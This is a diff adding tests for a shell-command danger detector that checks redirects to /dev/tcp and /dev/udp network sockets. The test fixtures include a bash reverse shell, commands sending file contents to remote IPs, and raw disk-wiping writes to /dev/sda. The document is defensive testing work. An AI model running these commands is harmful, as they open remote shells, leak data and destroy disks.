@@ -587,6 +587,49 @@ describe("findStaticMatch (shell dispatch)", () => {
   });
 });
 
+describe("network socket redirects (/dev/tcp, /dev/udp)", () => {
+  it("confirms output redirects to virtual network sockets", () => {
+    for (const cmd of [
+      "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "echo stolen > /dev/tcp/1.2.3.4/8080",
+      "curl http://x > /dev/udp/1.2.3.4/999",
+      "cat file >> /dev/tcp/1.2.3.4/80",
+    ]) {
+      assert.equal(findDangerousRule(cmd)?.name, "network socket redirect", cmd);
+      assert.equal(findDangerousRule(cmd)?.disposition, "confirm", cmd);
+    }
+  });
+  it("confirms input and read-write redirect forms", () => {
+    for (const cmd of ["cat < /dev/tcp/1.2.3.4/4444", "exec 3<>/dev/tcp/1.2.3.4/4444"]) {
+      assert.equal(findDangerousRule(cmd)?.name, "network socket redirect", cmd);
+    }
+  });
+  it("sees through shell payloads", () => {
+    assert.equal(
+      findDangerousRule("bash -c 'echo pwn > /dev/tcp/1.2.3.4/4444'")?.name,
+      "network socket redirect",
+    );
+  });
+  it("does not match safe targets, heredocs, here-strings, or quoted examples", () => {
+    for (const cmd of [
+      "ls > /dev/null",
+      "s=$(cmd 2>/dev/null)",
+      "cat <<'EOF' > /tmp/x\nbody\nEOF",
+      "cat <<< 'text'",
+      'echo "> /dev/tcp/1.2.3.4/4444"',
+      "echo >&2 done",
+    ]) {
+      assert.equal(findDangerousRule(cmd), undefined, cmd);
+    }
+  });
+  it("keeps real device writes hard-blocked (regression)", () => {
+    const m = findDangerousRule("cat img > /dev/sda");
+    assert.equal(m?.name, "raw device write (redirect)");
+    assert.equal(m?.disposition, "deny");
+    assert.equal(findDangerousRule("dd if=/dev/zero of=/dev/sda")?.disposition, "deny");
+  });
+});
+
 describe("catalog additions (service stops, broad chown, mv to device)", () => {
   it("confirms service lifecycle stops", () => {
     for (const cmd of [
